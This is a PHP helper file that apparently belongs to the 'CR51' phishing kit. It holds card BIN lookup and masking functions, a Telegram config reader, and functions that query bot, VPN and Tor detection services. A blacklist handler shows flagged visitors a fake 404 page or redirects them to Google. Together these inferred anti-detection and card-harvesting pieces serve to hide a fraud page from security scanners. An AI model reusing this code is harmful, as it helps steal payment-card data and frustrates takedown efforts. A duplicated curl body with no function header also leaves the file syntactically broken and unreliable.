<?php
function _time()
{
    $timezone = new DateTimeZone('Asia/Jakarta');
    $date = new DateTime();
    $date->setTimeZone($timezone);
    $time = $date->format('H:i A');

    return $time;
}

function _date()
{
    $timezone = new DateTimeZone('Asia/Jakarta');
    $date = new DateTime();
    $date->setTimeZone($timezone);
    $fullday = $date->format('H:i A - D, d M Y');

    return $fullday;
}

function write($filename, $mode, $data)
{
    $fp = @fopen($filename, $mode);
    @fwrite($fp, $data);
    @fclose($fp);
}

function look_bin($num)
{
    error_reporting(0);
    $num    = str_replace(' ', '', trim($num));
    $num    = substr($num, 0, 6);
    $result  = @json_decode(curl("https://lookup.binlist.net/" . $num, false, true), true);
    $brand   = ($result['scheme'] ? $result['scheme'] : "unknown brand");
    $type    = ($result['type'] ? $result['type'] : "unknown type");
    $level   = ($result['brand'] ? $result['brand'] : "unknown level");
    $bank    = ($result['bank']['name'] ? $result['bank']['name'] : "unknown bank");
    $data    = strtoupper($num . " " . $brand . " " . $type . " " . $level . " " . $bank);

    return $data;
}

function curl($url, $hasHeader = false, $hasBody = true, $useragent = NULL, $time = NULL)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3");

    curl_setopt($ch, CURLOPT_HEADER, $hasHeader ? 1 : 0);
    curl_setopt($ch, CURLOPT_NOBODY, $hasBody ? 0 : 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_0);


    if (!is_null($time))
        curl_setopt($ch, CURLOPT_TIMEOUT, $time);
    if (!is_null($time))
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $time);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
function product()
{
    $data = file_get_contents("https://api.area16.pw/v2/product.php");
    $products = json_decode($data, true);
    return $products;
}
function SiNGFO($name)
{
    $get = parse_ini_file(FCPATH . "CR51/Brain/ScriptInfo.ini");
    return $get[$name];
}
function kontak()
{
    $data = file_get_contents("https://api.area16.pw/v2/kontak.php");
    $products = json_decode($data, true);
    return $products;
}

{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3");

    curl_setopt($ch, CURLOPT_HEADER, $hasHeader ? 1 : 0);
    curl_setopt($ch, CURLOPT_NOBODY, $hasBody ? 0 : 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_0);


    if (!is_null($time))
        curl_setopt($ch, CURLOPT_TIMEOUT, $time);
    if (!is_null($time))
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $time);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}

function write_php_ini($array, $file)
{
    $res = array();
    foreach ($array as $key => $val) {

        if (is_array($val)) {
            $res[] = "[$key]";
            foreach ($val as $skey => $sval) $res[] = "$skey = " . (is_numeric($sval) ? $sval : '"' . $sval . '"');
        } else $res[] = "$key = " . (is_numeric($val) ? $val : '"' . $val . '"');
    }

    safefilerewrite($file, implode("\r\n", $res));
}

function safefilerewrite($fileName, $dataToSave)
{

    if ($fp = fopen($fileName, 'w')) {
        $startTime = microtime(TRUE);

        do {
            $canWrite = flock($fp, LOCK_EX);
            if (!$canWrite) usleep(round(rand(0, 100) * 1000));
        } while ((!$canWrite) and ((microtime(TRUE) - $startTime) < 5));

        if ($canWrite) {
            fwrite($fp, $dataToSave);
            flock($fp, LOCK_UN);
        }

        fclose($fp);
    }
}

function _404($message)
{
    echo "
    <!DOCTYPE html>
<html lang=\"en\">

<head>
	<meta charset=\"utf-8\">
	<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">
	<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">

	<title>404</title>
	<link href=\"https://fonts.googleapis.com/css?family=Kanit:200\" rel=\"stylesheet\">
	<link type=\"text/css\" rel=\"stylesheet\" href=\"" . base_url() . "CR51/Assets/Panel/css/font-awesome.min.css\" />
	<link type=\"text/css\" rel=\"stylesheet\" href=\"" . base_url() . "CR51/Assets/Panel/css/style.css\" />

</head>

<body>

	<div id=\"notfound\">
		<div class=\"notfound\">
			<div class=\"notfound-404\">
				<h1>404</h1>
			</div>
			<h2>Oops! Nothing was found</h2>
			<p>" . $message . ".</p>
		</div>
	</div>

</body>

</html>";
}

function view($view, $params = [])
{
    if (strncmp($view, '/', 1) !== 0) {
        $view = FCPATH . 'CR51/Views/' . $view . ".php";
    }

    if (is_file($view . '.php')) {
        $view .= '.php';
    }

    return renderFile($view, $params);
}

function renderFile($_file_, $_params_ = [])
{
    ob_start();
    ob_implicit_flush(false);
    extract($_params_, EXTR_OVERWRITE);
    require($_file_);

    return ob_get_clean();
}

function base_url()
{
    $base_url = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on") ? "https" : "http");
    $base_url .= "://" . @$_SERVER['HTTP_HOST'];
    $base_url .= str_replace(basename($_SERVER['SCRIPT_NAME']), "", $_SERVER['SCRIPT_NAME']);

    return $base_url;
}
function _redirect($name)
{
    $get = parse_ini_file(FCPATH . "CR51/Brain/redirect.ini");
    return $get[$name];
}
function checkbacklist($id, $name)
{
    $file = fopen("CR51/Brain/Backlist/" . $name . ".txt", "r");
    if ($file) {
        while (!feof($file)) {
            $blocked = trim(fgets($file));
            if ($id == $blocked) {
                if (_config('NOTFOUND') == '404') {
                    _404("The page you are looking for might have been removed had its name changed or is temporarily unavailable.");
                    write('CR51/Static/log_robot.txt', 'a', "|{$id}|Backlist Masuk Ke Halaman 404\r\n");
                    die;
                } else if (_config('NOTFOUND') == 'custom') {
                    write('CR51/Static/log_robot.txt', 'a', "|{$id}|Backlist Redirect Ke " . _redirect('Redirect') . "\r\n");
                    header("Location: https://href.li/?" . _redirect('Redirect'));
                    die;
                } else if (_config('NOTFOUND') == 'google') {
                    write('CR51/Static/log_robot.txt', 'a', "|{$id}|Backlist Redirect Ke https://www.google.com\r\n");
                    header("Location: https://href.li/?https://www.google.com");
                    die;
                } else {
                    _404("The page you are looking for might have been removed had its name changed or is temporarily unavailable.");
                }
            }
        }
        fclose($file);
    } else {
        die("Unable to open file CR51/Brain/Backlist/{$id}.txt");
    }
}
function _geoGet($ip_address)
{
    $url               = "http://ip-api.com/json/" . $ip_address;
    $getGeo            = json_decode(curl($url, false, true), 1);

    return $getGeo;
}

function redirect($uri = '', $method = 'auto', $code = NULL)
{
    if (!preg_match('#^(\w+:)?//#i', $uri)) {
        $uri = base_url($uri);
    }

    if ($method === 'auto' && isset($_SERVER['SERVER_SOFTWARE']) && strpos($_SERVER['SERVER_SOFTWARE'], 'Microsoft-IIS') !== FALSE) {
        $method = 'refresh';
    } elseif ($method !== 'refresh' && (empty($code) or !is_numeric($code))) {

        if (isset($_SERVER['SERVER_PROTOCOL'], $_SERVER['REQUEST_METHOD']) && $_SERVER['SERVER_PROTOCOL'] === 'HTTP/1.1') {
            $code = ($_SERVER['REQUEST_METHOD'] !== 'GET')
                ? 303
                : 307;
        } else {
            $code = 302;
        }
    }

    switch ($method) {

        case 'refresh':
            header('Refresh:0;url=' . $uri);
            break;

        default:
            header('Location: ' . $uri, TRUE, $code);
            break;
    }

    exit;
}

function _config($name)
{
    $get = parse_ini_file(FCPATH . "CR51/Brain/.settings.ini");
    return $get[$name];
}

function _antibot($name)
{
    $get = parse_ini_file(FCPATH . "CR51/Brain/antibot.ini");
    return $get[$name];
}

function _killbot($name)
{
    $get = parse_ini_file(FCPATH . "CR51/Brain/killbot.ini");
    return $get[$name];
}
function tel($name)
{
    $get = parse_ini_file(FCPATH . "CR51/Brain/telegram.ini");
    return $get[$name];
}

function CR51INI($name)
{
    $get = parse_ini_file(FCPATH . "CR51/Brain/cr51blocker.ini");
    return $get[$name];
}

function _panel($name)
{
    $get = parse_ini_file(FCPATH . "CR51/Brain/setpanel.ini");
    return $get[$name];
}

function ccMasking($number)
{
    return substr($number, 0, 0) . substr($number, -4);
}

function antibot($ip, $useragent)
{
    $key = _antibot('KEY');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_USERAGENT, "Antibot Blocker");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, "https://antibot.pw/api/v2-blockers?ip=" . $ip . "&apikey=" . $key . "&ua=" . urlencode($useragent) . "");
    $data = curl_exec($ch);
    curl_close($ch);
    $check = json_decode($data, 1);

    if ($check['is_bot'] == true) {
        return true;
    } else {
        return false;
    }
}

function killbot($ip, $useragent)
{
    $key = _killbot('KEY');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_USERAGENT, "Killbot Blocker");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, "https://killbot.org/api/v1/blocker?ip=" . $ip . "&apikey=" . $key . "&ua=" . urlencode($useragent) . "&url=" . urlencode($_SERVER['REQUEST_URI']));
    $data = curl_exec($ch);
    curl_close($ch);

    $json = json_decode($data, true);
    $meta = $json['meta']['code'];
    $blocked = $json['detect_by'] == 1 ? $json['data']['is_bot'] : $json['data']['block_access'];

    if ($meta = 200 && $blocked) {
        return true;
    } else {
        return false;
    }
}

function CR51BLOCKER($ip, $bots)
{
    $token = CR51INI('TOKEN');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.cr51.net/v1/blocker?token=" . $token . "&bots=" . $bots . "&ip=" . $ip . "");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $data = curl_exec($ch);
    curl_close($ch);

    $json = json_decode($data, true);
    $blok = $json['bots'];

    if ($blok == "detect") {
        return true;
    } else {
        return false;
    }
}

function CR51NETWORK($ip)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.cr51.net/json?ip=" . $ip . "");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $data = curl_exec($ch);
    curl_close($ch);

    $json = json_decode($data, true);
    $anonymous = $json['anonymous'];
    $proxy = $json['proxy'];
    $vpn = $json['vpn'];
    $tor = $json['tor'];
    $hosting = $json['hosting'];

    if ($anonymous == "detect" || $proxy == "detect" || $vpn == "detect" || $tor == "detect" || $hosting == "detect") {
        return true;
    } else {
        return false;
    }
}

function blackbox($ip)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://blackbox.ipinfo.app/lookup/" . $ip);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $resp = curl_exec($ch);
    curl_close($ch);
    $result = $resp;

    if ($result == "Y") {
        return true;
    } else {
        return false;
    }
}
